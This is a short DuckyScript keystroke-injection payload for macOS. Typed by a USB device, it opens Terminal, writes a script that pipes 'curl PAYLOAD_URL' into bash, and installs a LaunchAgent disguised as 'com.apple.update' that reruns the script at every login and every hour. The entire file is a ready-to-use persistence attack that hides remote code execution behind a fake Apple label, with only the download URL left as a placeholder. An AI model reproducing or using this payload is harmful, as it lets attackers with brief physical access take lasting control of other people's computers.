REM Author: UNC0V3R3D
REM Description: Installs a LaunchAgent plist that runs a payload script on every user login.
REM Version: 1.0
REM Category: Persistence
REM Target: macOS 10.15+
REM Requirements: Payload URL or local payload path
DELAY 1000
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
STRING bash -c "cat > /tmp/payload.sh << 'SCRIPT'
#!/bin/bash
curl -s PAYLOAD_URL | bash
SCRIPT
chmod +x /tmp/payload.sh"
ENTER
DELAY 500
STRING bash -c "cat > ~/Library/LaunchAgents/com.apple.update.plist << 'PLIST'
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
  <key>Label</key>
  <string>com.apple.update</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>/tmp/payload.sh</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>StartInterval</key>
  <integer>3600</integer>
</dict>
</plist>
PLIST
launchctl load ~/Library/LaunchAgents/com.apple.update.plist"
ENTER
DELAY 2000
STRING exit
ENTER
REM End of payload
